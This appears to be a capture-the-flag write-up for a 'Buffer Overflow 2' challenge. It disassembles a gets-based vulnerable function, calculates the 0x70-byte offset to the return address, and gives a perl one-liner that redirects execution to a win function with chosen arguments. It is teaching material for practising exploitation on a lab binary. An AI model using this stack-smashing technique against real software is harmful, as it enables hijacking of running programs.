# Buffer Overflow 2

Inspecting the vulnerable function, with some annotations about how far on the
stack we are from the return address

``` console
$ objdump -d -Mintel vuln | sed -n '/^[a-f0-9]\+ <vuln>/,/^$/p' 
08049338 <vuln>:
 8049338:	f3 0f 1e fb          	endbr32 
 804933c:	55                   	push   ebp      <--- -0x4
 804933d:	89 e5                	mov    ebp,esp  <--- store esp
 804933f:	53                   	push   ebx
 8049340:	83 ec 74             	sub    esp,0x74
 8049343:	e8 88 fe ff ff       	call   80491d0 <__x86.get_pc_thunk.bx>
 8049348:	81 c3 b8 2c 00 00    	add    ebx,0x2cb8
 804934e:	83 ec 0c             	sub    esp,0xc  
 8049351:	8d 45 94             	lea    eax,[ebp-0x6c] <--- load from stack
 8049354:	50                   	push   eax
 8049355:	e8 96 fd ff ff       	call   80490f0 <gets@plt>
 804935a:	83 c4 10             	add    esp,0x10
 804935d:	83 ec 0c             	sub    esp,0xc
 8049360:	8d 45 94             	lea    eax,[ebp-0x6c]
 8049363:	50                   	push   eax
 8049364:	e8 b7 fd ff ff       	call   8049120 <puts@plt>
 8049369:	83 c4 10             	add    esp,0x10
 804936c:	90                   	nop
 804936d:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8049370:	c9                   	leave  
 8049371:	c3                   	ret    
```

We know our `buf` is passed as the argument to `gets` and we want to know the
offset between this and the return address. Inspecting the call:

``` 
 8049351:	8d 45 94             	lea    eax,[ebp-0x6c]
 8049354:	50                   	push   eax
 8049355:	e8 96 fd ff ff       	call   80490f0 <gets@plt>
```

But `ebp` was not modified since the `mov ebp, esp` instruction, so our buffer
starts at `ebp-0x6c` but `ebp` is `0x4` bytes from the return address. So our
buffer is `0x6c + 0x4 = 0x70` bytes from where the return address is stored.

We need to fill the buffer, then push the address of the `win` function, then
push another return address (this can be anything since we don't care if the
program crashes after returning from `win`), then the two arguments we want (in
little endian) e.g. (using `0xffffffff` as our throw-away return value):

``` 
$ perl -E 'say("A" x 0x70 . "\x96\x92\x04\x08" . "\xff\xff\xff\xff"  . "\x0d\xf0\xfe\xca". "\x0d\xf0\x0d\xf0")'
```
